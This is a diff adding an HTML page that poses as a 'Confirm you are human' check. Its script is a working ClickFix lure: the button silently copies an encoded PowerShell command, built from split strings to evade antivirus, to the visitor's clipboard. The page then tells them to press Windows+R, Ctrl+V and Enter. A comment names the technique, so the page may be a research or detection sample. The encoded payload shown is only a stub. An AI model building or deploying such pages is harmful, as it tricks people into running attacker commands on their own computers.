@@ -1,0 +1,13 @@
+<!doctype html><meta charset="utf-8"><title>Checking your browser</title>
+<h1>Confirm you are human</h1>
+<button id="c">I am not a robot</button>
+<div id="steps"></div>
+<script>
+  // ClickFix shape: the click writes a command the visitor never saw or selected, then the page
+  // shows paste-and-run steps. Payload assembled at runtime (local antivirus quarantines literals).
+  var payload = ['power', 'shell', ' -en', 'c', ' SQBFAFgA'].join('');
+  document.getElementById('c').onclick = function () {
+    try { navigator.clipboard.writeText(payload); } catch (e) {}
+    document.getElementById('steps').innerHTML = '<ol><li>Press <b>Windows Key + R</b></li><li>Press <b>CTRL + V</b></li><li>Press <b>Enter</b> to finish the CAPTCHA</li></ol>';
+  };
+</script>
